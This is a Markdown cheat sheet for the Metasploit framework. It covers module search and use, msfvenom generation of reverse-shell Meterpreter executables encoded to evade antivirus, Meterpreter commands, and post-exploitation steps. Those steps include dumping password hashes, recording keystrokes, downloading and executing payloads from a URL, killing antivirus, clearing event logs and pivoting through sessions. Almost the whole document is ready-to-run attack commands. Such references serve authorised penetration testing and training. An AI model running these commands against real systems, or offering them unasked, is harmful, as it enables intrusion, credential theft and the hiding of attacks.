---
description: 
linkTitle: Metasploit
title: Metasploit cheat sheet
weight: 10
---


**Basic Metasploit Commands**

1. **Search for a Module**
    
    `msf > search [regex]`
    
2. **Specify an Exploit**
    
    `msf > use exploit/[ExploitPath]`
    
3. **Set a Payload**
    
    `msf > set PAYLOAD [PayloadPath]`
    
4. **Show Options for Current Modules**
    
    `msf > show options`
    
5. **Set Options**
    
    `msf > set [Option] [Value]`
    
6. **Start Exploit**
    
    `msf > exploit`
    

---

**Useful Auxiliary Modules**

- **Port Scanner**
- `msf > use auxiliary/scanner/portscan/tcp
msf > set RHOSTS 10.10.10.0/24
msf > run`
- **DNS Enumeration**
- `msf > use auxiliary/gather/dns_enum
msf > set DOMAIN target.tgt
msf > run`
- **FTP Server**
- `msf > use auxiliary/server/ftp
msf > set FTPROOT /tmp/ftproot
msf > run`
- **Proxy Server**
- `msf > use auxiliary/server/socks4
msf > run`

---

**Msfvenom Tool**

- **Generate Payloads**

```css
$ msfvenom –p [PayloadPath] –f [FormatType] LHOST=[LocalHost] LPORT=[LocalPort]

```

*Example:*

- `$ msfvenom -p windows/meterpreter/reverse_tcp -f exe LHOST=10.1.1.1 LPORT=4444 > met.exe`
- **Format Options**
    - `exe` – Executable
    - `pl` – Perl
    - `rb` – Ruby
    - `raw` – Raw shellcode
    - `c` – C code
- **Encoding Payloads**

```css
$ msfvenom -p [Payload] -e [Encoder] -f [FormatType] -i [EncodeIterations] LHOST=[LocalHost] LPORT=[LocalPort]

```

*Example:*

- `$ msfvenom -p windows/meterpreter/reverse_tcp -i 5 -e x86/shikata_ga_nai -f exe LHOST=10.1.1.1 LPORT=4444 > mal.exe`

---

**Metasploit Meterpreter Commands**

- **Base Commands**
    - `? / help`: Display command summary
    - `exit / quit`: Exit Meterpreter session
    - `sysinfo`: Show system name and OS
    - `shutdown / reboot`: Self-explanatory
- **File System Commands**
    - `cd`, `lcd`, `pwd / getwd`, `ls`, `cat`
    - `download / upload`
    - `mkdir / rmdir`
    - `edit`
- **Process Commands**
    - `getpid`, `getuid`, `ps`, `kill`, `execute`, `migrate`
- **Network Commands**
    - `ipconfig`, `portfwd`, `route`
- **Misc Commands**
    - `idletime`, `uictl [enable/disable] [keyboard/mouse]`, `screenshot`
- **Additional Modules**
    - `use [module]`
    - Example: `use priv`, `hashdump`, `timestomp`

---

**Managing Sessions**

- **Multiple Exploitation**
    - Single session, immediately backgrounded: `msf > exploit -z`
    - Multiple sessions, backgrounded: `msf > exploit –j`
- **Session Management**
    - List jobs: `msf > jobs –l`
    - Kill a job: `msf > jobs –k [JobID]`
    - List sessions: `msf > sessions -l`
    - Interact with a session: `msf > session -i [SessionID]`
    - Background current session: `meterpreter > <Ctrl+Z>` or `meterpreter > background`
- **Routing Through Sessions**

```css
msf > route add [Subnet to Route To] [Subnet Netmask] [SessionID]
```

**Advanced Metasploit Usage**

1. **Database Interaction**
    - **db_connect**: Connect to a database.
    - **db_disconnect**: Disconnect from the current database.
    - **db_status**: Display current database status.
    - **hosts**: List all hosts in the database.
    - **services**: List all services in the database.
    - **vulns**: List all vulnerabilities in the database.
2. **Post Exploitation**
    - **run post/windows/gather/checkvm**: Check if the target is a virtual machine.
    - **run post/multi/recon/local_exploit_suggester**: Suggest local exploits.
    - **run post/windows/manage/migrate**: Migrate Meterpreter to another process.
    - **run getprivs**: Attempt to enable all privileges available.
    - **run killav**: Attempt to kill common antivirus products.
3. **Credential Gathering**
    - **use auxiliary/scanner/smb/smb_login**: SMB login utility.
    - **use auxiliary/scanner/ssh/ssh_login**: SSH login utility.
    - **use auxiliary/scanner/http/http_login**: HTTP login utility.
    - **run post/windows/gather/hashdump**: Dump the SAM database.
4. **Pivoting**
    - **autoroute**: Automate route addition.
    - **socks4a**: Setup a SOCKS4a proxy server.
    - **use auxiliary/server/socks4a**: Start a SOCKS4a proxy server.
5. **Exploit Development**
    - **irb**: Drop into an interactive Ruby shell.
    - **edit**: Edit a file or module.
    - **reload_all**: Reload all modules.
6. **Using Exploits**
    - **check**: Check if the target is vulnerable to the selected exploit.
    - **setg / unsetg**: Set/unset a global variable.
    - **show targets / payloads / advanced / evasion**: Show targets, payloads, advanced options, or evasion techniques for the current exploit.
7. **Working with Modules**
    - **use [module type]/[module name]**: Load a specific module.
    - **back**: Move back from the current context.
    - **info**: Display information about one module.
8. **NOPS, Encoders, and Payloads**
    - **generate**: Generate a payload.
    - **encode**: Encode a payload to evade antivirus detection.
    - **nop**: Generate a series of NOP instructions.
9. **Resource Scripts**
    - **resource [path/to/script]**: Run commands from a resource script file.
    - **makerc [path/to/script]**: Save the current Metasploit framework commands to a resource script.
10. **Console and Environment**
    - **save**: Save the active datastores.
    - **setg [variable] [value]**: Set a global variable.
    - **unsetg [variable]**: Unset a global variable.
    - **spool [file]**: Write console output to a file.
11. **Listening and Handlers**
    - **exploit -j -z**: Run an exploit as a job in the background.
    - **set ExitOnSession false**: Do not terminate the exploit after a session has been created (useful for multi-target exploits).
    - **sessions -K**: Kill all active sessions.
12. **Working with Sessions**
    - **sessions -i [id]**: Interact with a specific session.
    - **sessions -u [id]**: Upgrade a normal shell to a Meterpreter shell.
    - **sessions -k [id]**: Kill a specific session.

**Post Exploitation**

1. **Gather Credentials**
    
    ```
    use post/windows/gather/hashdump
    set SESSION [SessionID]
    run
    
    ```
    
2. **Capture Keystrokes**
    
    ```
    use post/windows/capture/keylog_recorder
    set SESSION [SessionID]
    run
    
    ```
    
3. **Download and Execute Payloads**
    
    ```
    use post/windows/manage/download_exec
    set SESSION [SessionID]
    set URL [PayloadURL]
    set EXE [ExecutableName]
    run
    
    ```
    
4. **Clear Event Logs**
    
    ```
    use post/windows/manage/clear_event_logs
    set SESSION [SessionID]
    run
    
    ```
    

**Pivoting**

- **Setup a SOCKS Proxy**
    
    ```
    use auxiliary/server/socks_proxy
    set SRVHOST [LocalHost]
    set SRVPORT [LocalPort]
    run
    
    ```
    
- **Add Route for Pivoting**
    
    ```
    use post/multi/manage/autoroute
    set SESSION [SessionID]
    set SUBNET [TargetSubnet]
    set NETMASK [SubnetMask]
    run
    
    ```
    

---

**Database Commands**

- **Connect to the Database**`msf > db_connect [user]:[pass]@[host]:[port]/[database]`
- **Import Scan Results**`msf > db_import [filename.xml]`
- **Export Data**`msf > db_export -f [format] -a [filename]`

---

**Exploit Development**

- **Check if a Module is Loaded**`msf > use [module]; info`
- **Reload All Modules**`msf > reload_all`
- **Check for Vulnerable Software**
    
    ```
    use auxiliary/scanner/http/version_scanner
    set RHOSTS [TargetIP]
    run
    
    ```
    

---

**Advanced Usage**

- **Use Meterpreter Script**`run [script]`
- **Execute System Commands Directly**`execute -f [command] -i`
- **Listening for Incoming Connections**
    
    ```
    use exploit/multi/handler
    set PAYLOAD [PayloadType]
    set LHOST [LocalHost]
    set LPORT [LocalPort]
    exploit
    
    ```
    
- **Using Plugins**
    - Load a plugin: `load [plugin]`
    - Unload a plugin: `unload [plugin]`

---

**Miscellaneous**

- **Working with Workspaces**
    - Create: `workspace -a [name]`
    - Switch: `workspace [name]`
    - Delete: `workspace -d [name]`
- **Using Resource Scripts**
    - Run a resource script: `resource [path/to/script.rc]`
- **Generating Reports**
    - Generate a report: `db_export -f [format] [filename]`

---